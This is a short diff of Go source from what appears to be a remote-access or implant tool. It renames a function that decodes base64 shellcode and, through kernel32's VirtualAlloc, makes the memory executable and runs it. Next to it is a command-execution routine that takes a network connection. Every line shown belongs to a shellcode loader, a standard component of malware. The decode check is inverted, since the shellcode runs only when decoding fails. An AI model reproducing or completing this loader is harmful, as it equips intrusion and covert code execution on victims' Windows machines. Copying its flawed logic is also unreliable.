@@ -37,13 +37,13 @@ func ExecuteCmd(command string, conn net.Conn) {
 func InjectShellCode(encShellcode string) {
 	if encShellcode != "" {
 		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err != nil {
-			go ExecShellcode(shellcode)
+			go ExecShellCode(shellcode)
 		}
 	}
 }
 
 // ExecShellcode sets the memory page containing the shellcode to R-X, then execute shellcode as a function
-func ExecShellcode(shellcode []byte) {
+func ExecShellCode(shellcode []byte) {
 	// Resolve kernell32.dll, and VirtualAlloc
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
 	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
